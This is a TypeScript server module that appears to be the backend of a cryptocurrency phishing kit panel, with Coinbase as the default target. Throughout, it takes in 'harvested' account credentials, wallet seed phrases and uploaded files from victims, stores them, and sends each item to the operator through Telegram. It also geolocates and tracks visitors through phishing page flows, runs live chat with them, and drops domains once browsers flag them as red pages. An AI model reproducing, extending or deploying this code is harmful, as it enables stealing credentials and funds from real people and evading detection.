import type { IncomingMessage, ServerResponse } from 'node:http';
import { serverState, type Visitor } from './state.js';
import { broadcast, broadcastStats } from './websocket.js';
import { lookupIp } from './geoip.js';
import {
	dbSaveHarvestedData,
	dbGetConversationByIp,
	dbUpsertConversation,
	dbInsertMessage
} from './database.js';
import { notifyHarvest } from './telegram.js';
import crypto from 'node:crypto';

let apiKey: string = process.env.API_KEY || '';

export function getOrCreateApiKey(): string {
	if (!apiKey) {
		apiKey = crypto.randomBytes(24).toString('hex');
		console.log(`[api] Generated API key: ${apiKey}`);
		console.log('[api] Set API_KEY env var to use a fixed key');
	}
	return apiKey;
}

function parseBody(req: IncomingMessage): Promise<any> {
	return new Promise((resolve, reject) => {
		const chunks: Buffer[] = [];
		req.on('data', (chunk: Buffer) => chunks.push(chunk));
		req.on('end', () => {
			try {
				const body = Buffer.concat(chunks).toString();
				resolve(body ? JSON.parse(body) : {});
			} catch {
				reject(new Error('Invalid JSON'));
			}
		});
		req.on('error', reject);
	});
}

function json(res: ServerResponse, status: number, data: unknown): void {
	res.writeHead(status, {
		'Content-Type': 'application/json',
		'Access-Control-Allow-Origin': '*',
		'Access-Control-Allow-Headers': 'Content-Type, X-API-Key'
	});
	res.end(JSON.stringify(data));
}

function validateApiKey(req: IncomingMessage): boolean {
	const key = getOrCreateApiKey();
	const provided = req.headers['x-api-key'];
	return provided === key;
}

function parseUserAgent(ua: string): string {
	if (!ua) return 'Unknown';
	const isMobile = /mobile|android|iphone|ipad/i.test(ua);
	const platform = isMobile ? 'Mobile' : 'Desktop';

	if (ua.includes('Firefox')) return `${platform} - Firefox`;
	if (ua.includes('Edg')) return `${platform} - Edge`;
	if (ua.includes('Safari') && !ua.includes('Chrome')) return `${platform} - Safari`;
	if (ua.includes('Chrome')) return `${platform} - Chrome`;
	return `${platform} - Other`;
}

function parseBrowserName(ua: string): string {
	if (!ua) return 'Unknown';
	if (ua.includes('Firefox')) return 'Firefox';
	if (ua.includes('Edg')) return 'Edge';
	if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
	if (ua.includes('Chrome')) return 'Chrome';
	return 'Other';
}

// Routes owned by the ingestion API (key-protected). Anything else falls
// through to SvelteKit so the panel's session-based REST endpoints work.
const INGESTION_ROUTES = new Set([
	'/api/visitor/connect',
	'/api/visitor/disconnect',
	'/api/visitor/flow',
	'/api/visitor/nextpage',
	'/api/visitor/livechat',
	'/api/data/account',
	'/api/data/phrase',
	'/api/data/upload',
	'/api/host/redpage'
]);

// Returns true if the request was handled
export async function handleApiRequest(req: IncomingMessage, res: ServerResponse): Promise<boolean> {
	const url = req.url || '';
	const route = url.replace(/\?.*$/, '');
	if (!INGESTION_ROUTES.has(route)) return false;

	if (req.method === 'OPTIONS') {
		res.writeHead(204, {
			'Access-Control-Allow-Origin': '*',
			'Access-Control-Allow-Methods': 'POST, OPTIONS',
			'Access-Control-Allow-Headers': 'Content-Type, X-API-Key',
			'Access-Control-Max-Age': '86400'
		});
		res.end();
		return true;
	}

	if (req.method !== 'POST') {
		json(res, 405, { error: 'Method not allowed' });
		return true;
	}

	if (!validateApiKey(req)) {
		json(res, 401, { error: 'Invalid or missing API key' });
		return true;
	}

	try {
		const body = await parseBody(req);
		switch (route) {
			case '/api/visitor/connect':
				await handleVisitorConnect(body, req);
				json(res, 200, { ok: true });
				break;
			case '/api/visitor/disconnect':
				handleVisitorDisconnect(body);
				json(res, 200, { ok: true });
				break;
			case '/api/visitor/flow':
				handleVisitorFlow(body);
				json(res, 200, { ok: true });
				break;
			case '/api/data/account':
				await handleDataAccount(body);
				json(res, 200, { ok: true });
				break;
			case '/api/data/phrase':
				await handleDataPhrase(body);
				json(res, 200, { ok: true });
				break;
			case '/api/data/upload':
				await handleDataUpload(body);
				json(res, 200, { ok: true });
				break;
			case '/api/host/redpage':
				handleRedpage(body);
				json(res, 200, { ok: true });
				break;
			case '/api/visitor/nextpage':
				handleNextPage(body);
				json(res, 200, { ok: true });
				break;
			case '/api/visitor/livechat':
				await handleVisitorLiveChat(body);
				json(res, 200, { ok: true });
				break;
		}
	} catch (err: any) {
		json(res, 400, { error: err.message || 'Bad request' });
	}

	return true;
}

async function handleVisitorConnect(
	body: { ip?: string; userAgent?: string; flow?: string; platform?: string; module?: string; email?: string; host?: string; capturedBy?: string },
	req: IncomingMessage
): Promise<void> {
	const ip = body.ip || req.socket.remoteAddress || 'unknown';
	const flow = body.flow || 'crypto/loading';
	const platform = body.platform || 'crypto';
	const module = body.module || 'Coinbase';
	const userAgent = body.userAgent || req.headers['user-agent'] || '';
	const device = parseUserAgent(userAgent);
	const browser = parseBrowserName(userAgent);

	const geo = await lookupIp(ip);

	const visitor: Visitor = {
		ip,
		flag: geo.flag,
		city: geo.city,
		region: geo.region,
		country: geo.country,
		status: 'online',
		flow,
		lastSeen: 'now',
		connectedAt: Date.now(),
		phrases: 0,
		accounts: 0,
		uploads: 0,
		platform,
		device,
		lastPage: '',
		lastPageRoute: '',
		flowSteps: [],
		inputs: {},
		wallets: [],
		screenSize: '',
		timezone: '',
		browser,
		os: '',
		cpuCores: 0,
		email: body.email || '',
		module,
		userId: crypto.randomUUID(),
		userAgent,
		flowBypassed: false,
		capturedBy: body.capturedBy || '',
		lastTwoDigits: ''
	};

	const existing = serverState.visitors.get(ip);
	if (existing) {
		visitor.phrases = existing.phrases;
		visitor.accounts = existing.accounts;
		visitor.uploads = existing.uploads;
		visitor.flowSteps = existing.flowSteps;
		visitor.inputs = existing.inputs;
		visitor.wallets = existing.wallets;
		visitor.userId = existing.userId || visitor.userId;
		visitor.email = existing.email || visitor.email;
		visitor.flowBypassed = existing.flowBypassed;
		visitor.capturedBy = existing.capturedBy || visitor.capturedBy;
		visitor.lastTwoDigits = existing.lastTwoDigits;
	}

	serverState.addVisitor(visitor);

	const logEntry = serverState.addLogEntry(
		`Visitor ${ip} connected \u2014 ${flow}`,
		'connect'
	);

	broadcast({ type: 'visitor:connected', payload: visitor });
	broadcast({ type: 'log:new', payload: logEntry });
	broadcastStats();
}

function handleVisitorDisconnect(body: { ip?: string }): void {
	if (!body.ip) return;

	const visitor = serverState.removeVisitor(body.ip);
	if (!visitor) return;

	const logEntry = serverState.addLogEntry(
		`Visitor ${body.ip} disconnected`,
		'disconnect'
	);

	broadcast({ type: 'visitor:disconnected', payload: { ip: body.ip } });
	broadcast({ type: 'log:new', payload: logEntry });
	broadcastStats();
}

function handleVisitorFlow(body: { ip?: string; flow?: string }): void {
	if (!body.ip || !body.flow) return;

	const visitor = serverState.pushVisitor(body.ip, body.flow);
	if (!visitor) return;

	const logEntry = serverState.addLogEntry(
		`Visitor ${body.ip} connected \u2014 ${body.flow}`,
		'connect'
	);

	broadcast({ type: 'visitor:updated', payload: visitor });
	broadcast({ type: 'log:new', payload: logEntry });
}

async function handleDataAccount(body: { ip?: string; flow?: string; data?: any }): Promise<void> {
	if (!body.ip) return;

	const visitor = serverState.updateVisitorData(body.ip, 'accounts');
	if (!visitor) return;

	const flow = body.flow || visitor.flow;
	dbSaveHarvestedData(body.ip, flow, 'account', body.data || {});
	notifyHarvest({ visitorIp: body.ip, flow, type: 'account', data: body.data, userAgent: visitor.userAgent, capturedBy: visitor.capturedBy }).catch(() => {});

	const logEntry = serverState.addLogEntry(
		`[crypto] account data from ${body.ip} on ${flow}`,
		'data'
	);

	broadcast({ type: 'visitor:updated', payload: visitor });
	broadcast({ type: 'log:new', payload: logEntry });
	broadcastStats();
}

async function handleDataPhrase(body: { ip?: string; flow?: string; data?: any }): Promise<void> {
	if (!body.ip) return;

	const visitor = serverState.updateVisitorData(body.ip, 'phrases');
	if (!visitor) return;

	const flow = body.flow || visitor.flow;
	dbSaveHarvestedData(body.ip, flow, 'phrase', body.data || {});
	notifyHarvest({ visitorIp: body.ip, flow, type: 'phrase', data: body.data, userAgent: visitor.userAgent, capturedBy: visitor.capturedBy }).catch(() => {});

	const logEntry = serverState.addLogEntry(
		`[crypto] seed phrase from ${body.ip} on ${flow}`,
		'data'
	);

	broadcast({ type: 'visitor:updated', payload: visitor });
	broadcast({ type: 'log:new', payload: logEntry });
	broadcastStats();
}

async function handleDataUpload(body: { ip?: string; flow?: string; filename?: string; data?: any }): Promise<void> {
	if (!body.ip) return;

	const visitor = serverState.updateVisitorData(body.ip, 'uploads');
	if (!visitor) return;

	const flow = body.flow || visitor.flow;
	const merged = { filename: body.filename, ...(body.data || {}) };
	dbSaveHarvestedData(body.ip, flow, 'upload', merged);
	notifyHarvest({ visitorIp: body.ip, flow, type: 'upload', data: merged, userAgent: visitor.userAgent, capturedBy: visitor.capturedBy }).catch(() => {});

	const logEntry = serverState.addLogEntry(
		`[crypto] file upload from ${body.ip} on ${flow}`,
		'data'
	);

	broadcast({ type: 'visitor:updated', payload: visitor });
	broadcast({ type: 'log:new', payload: logEntry });
	broadcastStats();
}

function handleRedpage(body: { domain?: string }): void {
	if (!body.domain) return;

	serverState.deleteHost(body.domain);

	const logEntry = serverState.addLogEntry(
		`Redpage detected for ${body.domain}, domain deleted`,
		'alert'
	);

	broadcast({ type: 'host:redpage', payload: { domain: body.domain } });
	broadcast({ type: 'log:new', payload: logEntry });
}

async function handleVisitorLiveChat(body: { ip?: string; module?: string; body?: string }): Promise<void> {
	if (!body.ip || !body.body) return;
	const visitor = serverState.visitors.get(body.ip);
	const moduleName = body.module || visitor?.module || '';

	let conv = dbGetConversationByIp(body.ip);
	if (!conv) conv = dbUpsertConversation(body.ip, moduleName);

	const msg = dbInsertMessage({
		conversationId: conv.id,
		sender: 'visitor',
		authorName: visitor?.email || body.ip,
		body: body.body,
		seen: false,
		createdAt: Date.now()
	});

	const logEntry = serverState.addLogEntry(`live-chat from ${body.ip}: "${body.body.slice(0, 60)}"`, 'data');
	broadcast({ type: 'livechat:msg:new', payload: { conversationId: conv.id, message: msg, visitorIp: body.ip } });
	broadcast({ type: 'log:new', payload: logEntry });
}

function handleNextPage(body: { ip?: string }): void {
	if (!body.ip) return;

	const visitor = serverState.visitors.get(body.ip);
	if (!visitor || visitor.flowSteps.length === 0) return;

	const currentIdx = visitor.flowSteps.findIndex((s) => !s.passed);
	if (currentIdx !== -1) {
		visitor.flowSteps[currentIdx].passed = true;
	}

	const nextStep = visitor.flowSteps.find((s) => !s.passed);
	if (nextStep) {
		visitor.lastPage = nextStep.page;
	}

	broadcast({ type: 'visitor:nextpage', payload: { ip: body.ip } });
	broadcast({ type: 'visitor:updated', payload: visitor });

	const logEntry = serverState.addLogEntry(
		`Visitor ${body.ip} completed page step`,
		'action'
	);
	broadcast({ type: 'log:new', payload: logEntry });
}
